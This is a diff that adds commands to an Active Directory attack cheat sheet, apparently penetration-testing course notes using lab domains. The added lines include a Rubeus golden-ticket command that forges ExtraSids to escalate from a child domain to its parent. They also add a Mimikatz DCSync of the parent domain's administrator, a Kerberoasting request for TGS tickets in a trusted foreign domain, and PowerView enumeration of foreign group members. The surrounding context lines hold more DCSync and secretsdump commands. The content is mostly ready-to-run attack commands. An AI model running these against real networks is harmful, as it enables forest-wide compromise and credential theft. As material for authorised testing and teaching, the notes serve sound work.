@@ -95,6 +95,16 @@ klist
 mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
 ```
 
+#### Full Windows chain (Rubeus + Mimikatz)
+```powershell
+# Create golden ticket with ExtraSids via Rubeus
+.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<CHILD.DOMAIN> /sid:<child_sid> /sids:<parent_ea_sid> /user:hacker /ptt
+
+# Then DCSync the parent
+.\mimikatz.exe
+lsadump::dcsync /user:<PARENT>\administrator /domain:<PARENT.DOMAIN>
+```
+
 ### From Linux
 
 #### DCSync child domain for KRBTGT hash
@@ -143,6 +153,9 @@ Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | Get-DomainSPN
 ### From Linux
 ```bash
 GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+
+# Request the actual TGS tickets
+GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
 ```
 
 ### Admin Password Reuse
@@ -154,6 +167,12 @@ secretsdump.py FREIGHTLOGISTICS.LOCAL/administrator@academy-ea-dc03.freightlogis
 ### Foreign Group Membership
 - BloodHound: Check for users from one domain that are members of groups in another domain
 - Query: "Find users that belong to groups in another domain"
+
+```powershell
+# PowerView: enumerate foreign group members
+Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
+Convert-SidToName <SID>
+```
 
 ## SID Filtering
 - SID Filtering sanitizes the SID History attribute for cross-forest trusts
